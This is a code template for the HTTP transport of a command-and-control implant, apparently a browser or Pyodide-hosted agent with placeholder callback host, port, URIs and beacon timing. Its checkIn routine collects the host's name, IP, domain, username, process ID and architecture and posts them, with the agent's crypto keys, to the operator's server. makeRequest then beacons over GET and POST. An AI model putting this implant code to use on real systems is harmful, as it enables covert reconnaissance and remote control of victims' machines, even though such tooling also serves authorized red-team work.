### IMPORTS ###

### CLASS_FIELDS ###

### FUNCTIONS ###
    async def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(await self.makeRequest(self.formatMessage(data), 'POST')))

    async def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(await self.makeRequest(self.formatMessage(data, True))))

    async def checkIn(self):
        hostname = ''
        ip = ''
        domain = ''
        try:
            import socket
            try:
                hostname = socket.gethostname()
            except:
                hostname = ''
            if hostname and len(hostname) > 0:
                try:
                    ip = socket.gethostbyname(hostname)
                except:
                    pass
            try:
                domain = socket.getfqdn()
            except:
                domain = ''
        except:
            pass
        try:
            pid = os.getpid()
        except:
            pid = 0

        data = {
            "action": "checkin",
            "ip": ip,
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": hostname,
            "domain": domain,
            "pid": pid,
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        response_data = await self.postMessageAndRetrieveResponse(data)
        if("status" in response_data):
            UUID = response_data["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False

    async def makeRequest(self, data, method='GET'):
        from pyodide.http import pyfetch
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header] = self.agent_config["Headers"][header]
        # pyfetch has no timeout of its own; restore the stock sync-transport timeout contract.
        timeout = float(self.agent_config.get("_timeout", 30))
        try:
            if method == 'GET':
                response = await asyncio.wait_for(pyfetch(
                    self.agent_config["Server"] + ":" + self.agent_config["Port"] +
                    self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] +
                    "=" + data.decode(), method="GET", headers=hdrs), timeout=timeout)
            else:
                response = await asyncio.wait_for(pyfetch(
                    self.agent_config["Server"] + ":" + self.agent_config["Port"] +
                    self.agent_config["PostURI"], method="POST", headers=hdrs, body=data),
                    timeout=timeout)
            raw = await response.bytes()
            return base64.b64decode(raw)
        except: return ""

### CONFIG ###
            "Server": "callback_host",
            "Port": "callback_port",
            "PostURI": "/post_uri",
            "Headers": HEADER_PLACEHOLDER,
            "Sleep": callback_interval,
            "Jitter": callback_jitter,
            "GetURI": "/get_uri",
            "GetParam": "query_path_name",